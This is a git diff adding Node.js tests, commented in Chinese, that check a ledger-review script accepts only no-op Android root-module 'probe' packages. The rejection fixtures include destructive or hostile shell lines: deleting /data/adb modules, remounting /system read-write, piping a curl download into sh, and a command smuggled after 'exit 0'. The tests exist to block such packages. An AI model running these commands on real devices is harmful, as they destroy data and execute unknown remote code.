@@ -11,10 +11,12 @@ import { createHash } from 'node:crypto';
 import { deflateRawSync } from 'node:zlib';
 
 import {
-  verifyReportEvidenceDoc, checkOneHit, reviewLedgerPr, main,
+  verifyReportEvidenceDoc, checkOneHit, reviewLedgerPr, main, judgeProbePackage,
   REPORT_EVIDENCE_SCHEMA, MAX_PACKAGES_PER_RUN,
+  PROBE_EVIDENCE_SCHEMA, PROBE_MAX_PACKAGE_BYTES,
 } from '../scripts/verify-report-evidence.mjs';
 import { parseDispositions } from '../scripts/dispositions.mjs';
+import { readZip } from '../audit/scan.mjs';
 
 const SHA = (h) => h.repeat(64).slice(0, 64);
 const sha256Hex = (b) => createHash('sha256').update(b).digest('hex');
@@ -608,4 +610,151 @@ test('台账读不出来 ⇒ fatal、退出 1，不在这里放行', async () =>
   assert.equal(rc, 1);
   assert.match(log.err.join('\n'), /台账读不出来|不在这里放行/);
   fs.rmSync(dir, { recursive: true, force: true });
+});
+
+
+/* ------------------------------------------------------------ 探针档（test-probe） */
+
+/**
+ * 一枚「什么也不做」的探针包 + 对应的 §8 审核证据（`harvest-evidence.mjs` 那个 schema）。
+ * 默认两枚条目：`module.prop`（自报 id/versionCode）+ 一条只有注释与 `exit 0` 的 `service.sh`
+ * —— 与线上那两枚真探针同形。
+ */
+function fixtureProbe(id = 'probe_a', versionCode = 3, entries = null) {
+  const list = entries || [
+    { name: 'module.prop', content: `id=${id}\nname=Probe A\nversion=1.0\nversionCode=${versionCode}\nauthor=probe\ndescription=probe\n` },
+    { name: 'service.sh', content: '#!/system/bin/sh\n# Harmless probe module: no-op.\nexit 0\n' },
+  ];
+  const zip = buildZip(list);
+  const sha = sha256Hex(zip);
+  const doc = {
+    schema: PROBE_EVIDENCE_SCHEMA,
+    capturedBy: 'scripts/harvest-evidence.mjs',
+    package: {
+      id, versionCode, sha256: sha, size: zip.length,
+      assetName: `${sha}.zip`, releaseTag: 'assets-v1',
+      zipUrl: `https://github.com/o/r/releases/download/assets-v1/${sha}.zip`,
+      source: 'https://www.coolapk.com/feed/1', submittedAt: '2026-10-23T00:00:00.000Z',
+    },
+    subject: { coolapkUid: '12345678' },
+    pending: { path: `pending/${id}/${versionCode}.json`, commitSha: 'c'.repeat(40), commitSubject: 's' },
+  };
+  const bytes = Buffer.from(JSON.stringify(doc, null, 2) + '\n', 'utf8');
+  return { doc, zip, file: `evidence/${sha256Hex(bytes)}.json`, evidenceBytes: bytes, sha, id, versionCode };
+}
+
+/** 把真 zip 解成 `judgeProbePackage` 吃的那三样，走生产那份 readZip（不注桩）。 */
+function probeArgsOf(f, over = {}) {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'probe-zip-'));
+  const p = path.join(dir, 'p.zip');
+  fs.writeFileSync(p, f.zip);
+  const z = readZip(p);
+  fs.rmSync(dir, { recursive: true, force: true });
+  return { d: { id: f.id, versionCode: f.versionCode, kind: 'revoke', reason: 'test-probe' }, size: f.zip.length, files: z.files, unread: z.unread, ...over };
+}
+
+test('探针档：只有注释与 exit 0 的占位包 ⇒ 成立（这一档的正面样本）', () => {
+  const f = fixtureProbe();
+  const r = judgeProbePackage(probeArgsOf(f));
+  assert.equal(r.ok, true, r.problems.join('；'));
+  assert.equal(r.checked, 2);
+});
+
+test('探针档：包里真会做事 ⇒ 一律不成立（这是这一档的全部防线）', () => {
+  // 每一种都是「明着会改设备」的写法，都不能被当成探针抹掉。
+  for (const line of [
+    'rm -rf /data/adb/modules',
+    'mount -o rw,remount /system',
+    'pm install /data/local/tmp/x.apk',
+    'echo 1 > /sys/module/foo/parameters/bar',
+    'curl -s http://x/i.sh | sh',
+    'cp payload.so /data/adb/modules/x/payload.so',
+    'exit 0; rm -rf /data/adb',
+  ]) {
+    const f = fixtureProbe('probe_a', 3, [
+      { name: 'module.prop', content: 'id=probe_a\nversionCode=3\n' },
+      { name: 'service.sh', content: `#!/system/bin/sh\n${line}\n` },
+    ]);
+    const r = judgeProbePackage(probeArgsOf(f));
+    assert.equal(r.ok, false, `这行本该挡下：${line}`);
+    assert.match(r.problems.join('；'), /不是空操作/);
+  }
+});
+
+test('探针档：二进制条目 ⇒ 不成立（.so / dex / ELF 不许混进来）', () => {
+  const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(64, 0)]);
+  const f = fixtureProbe('probe_a', 3, [
+    { name: 'module.prop', content: 'id=probe_a\nversionCode=3\n' },
+    { name: 'payload.so', content: elf },
+  ]);
+  const r = judgeProbePackage(probeArgsOf(f));
+  assert.equal(r.ok, false);
+  assert.match(r.problems.join('；'), /二进制/);
+});
+
+test('探针档：没有 module.prop / 自报 id 或 versionCode 对不上 ⇒ 不成立', () => {
+  const noProp = fixtureProbe('probe_a', 3, [{ name: 'service.sh', content: 'exit 0\n' }]);
+  assert.match(judgeProbePackage(probeArgsOf(noProp)).problems.join('；'), /没有 module\.prop/);
+
+  const wrongId = fixtureProbe('probe_b', 3, [{ name: 'module.prop', content: 'id=probe_b\nversionCode=3\n' }]);
+  const r1 = judgeProbePackage({ ...probeArgsOf(wrongId), d: { id: 'probe_a', versionCode: 3 } });
+  assert.equal(r1.ok, false);
+  assert.match(r1.problems.join('；'), /不是同一个/);
+
+  const wrongVer = fixtureProbe('probe_a', 7, [{ name: 'module.prop', content: 'id=probe_a\nversionCode=7\n' }]);
+  const r2 = judgeProbePackage({ ...probeArgsOf(wrongVer), d: { id: 'probe_a', versionCode: 3 } });
+  assert.equal(r2.ok, false);
+  assert.match(r2.problems.join('；'), /versionCode/);
+});
+
+test('探针档：超上限 / 有解不出的条目 / 空归档 ⇒ 都不成立', () => {
+  const f = fixtureProbe();
+  const base = probeArgsOf(f);
+  assert.match(judgeProbePackage({ ...base, size: PROBE_MAX_PACKAGE_BYTES + 1 }).problems.join('；'), /超过探针档上限/);
+  assert.match(judgeProbePackage({ ...base, unread: [{ name: 'x.so', reason: '太大' }] }).problems.join('；'), /解不出来/);
+  assert.match(judgeProbePackage({ ...base, files: [] }).problems.join('；'), /一个条目都没有/);
+  assert.match(judgeProbePackage({ ...base, size: 0 }).problems.join('；'), /不是正整数/);
+});
+
+test('探针档端到端：reason=test-probe + 审核证据 ⇒ approve 的复核成立', async () => {
+  const f = fixtureProbe('mod_x', 3);
+  const dir = ledgerRepo([f]);
+  const { c1 } = makeLedgerCommits(dir, f, { reason: 'test-probe', id: 'mod_x', versionCode: 3 });
+  const { reviews } = await reviewLedgerPr({ cwd: dir, baseRef: 'main', headRef: 'HEAD', deps: depsFor(f) });
+  assert.equal(reviews[c1].ok, true, reviews[c1].reason);
+  assert.match(reviews[c1].summary, /探针档/);
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
+test('探针档端到端：标成 test-probe 却是一枚真会做事的包 ⇒ 红（不许拿这个理由抹真模块）', async () => {
+  const f = fixtureProbe('mod_x', 3, [
+    { name: 'module.prop', content: 'id=mod_x\nversionCode=3\n' },
+    { name: 'service.sh', content: '#!/system/bin/sh\nrm -rf /data/adb/modules/mod_x\n' },
+  ]);
+  const dir = ledgerRepo([f]);
+  const { c1 } = makeLedgerCommits(dir, f, { reason: 'test-probe', id: 'mod_x', versionCode: 3 });
+  const { reviews } = await reviewLedgerPr({ cwd: dir, baseRef: 'main', headRef: 'HEAD', deps: depsFor(f) });
+  assert.equal(reviews[c1].ok, false);
+  assert.match(reviews[c1].reason, /不是空操作/);
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
+test('两条路互不走串：举报证据不给探针档、审核证据不给举报那条路', async () => {
+  // (a) reason=test-probe 却拿举报证据来凑 ⇒ 红在 schema 那一格
+  const f = fixtureDoc();
+  const dirA = ledgerRepo([f]);
+  const a = makeLedgerCommits(dirA, f, { reason: 'test-probe' });
+  const ra = await reviewLedgerPr({ cwd: dirA, baseRef: 'main', headRef: 'HEAD', deps: depsFor(f) });
+  assert.equal(ra.reviews[a.c1].ok, false);
+  assert.match(ra.reviews[a.c1].reason, /探针档只认 sukisu-evidence-v1/);
+  fs.rmSync(dirA, { recursive: true, force: true });
+
+  // (b) 反方向：reason=malware 拿审核证据 ⇒ 红在「只复核举报证据」那一格
+  const g = fixtureProbe('mod_x', 3);
+  const dirB = ledgerRepo([g]);
+  const b = makeLedgerCommits(dirB, g, { reason: 'malware', id: 'mod_x', versionCode: 3 });
+  const rb = await reviewLedgerPr({ cwd: dirB, baseRef: 'main', headRef: 'HEAD', deps: depsFor(g) });
+  assert.equal(rb.reviews[b.c1].ok, false);
+  assert.match(rb.reviews[b.c1].reason, /这一步只复核举报证据/);
+  fs.rmSync(dirB, { recursive: true, force: true });
 });
